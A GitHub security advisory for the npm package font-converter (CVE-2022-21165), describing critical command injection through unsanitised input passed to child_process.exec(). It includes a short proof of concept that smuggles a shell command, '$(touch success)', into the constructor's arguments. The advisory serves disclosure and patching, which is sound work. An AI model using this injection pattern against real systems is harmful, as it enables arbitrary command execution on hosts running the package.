# [C] Font-Converter Vulnerable to Arbitrary Command Injection

## Summary
Severity: Critical
Advisory: GHSA-g2c3-vwff-m3xr
CVE: CVE-2022-21165
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2022-08-29
Source: https://github.com/advisories/GHSA-g2c3-vwff-m3xr
Type: github-advisory

## Affected
- npm: `font-converter` — affected >=0

## Details
### Overview
font-converter is a FontForge wrapper that allows conversion between different font formats (TTF, WOFF, OTF)

All versions of this package are vulnerable to Arbitrary Command Injection due to missing sanitization of input that potentially flows into the `child_process.exec()` function.

### PoC
```js
var PUT = require('font-converter');
var x = "$(touch success);# ";
try {
    new PUT(x, x, x, x);
} catch (e) {
    console.log(e);
}
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2022-21165
- https://github.com/zgec/node-js-font-converter
- https://github.com/zgec/node-js-font-converter/blob/master/index.js#L12
- https://security.snyk.io/vuln/SNYK-JS-FONTCONVERTER-2976194
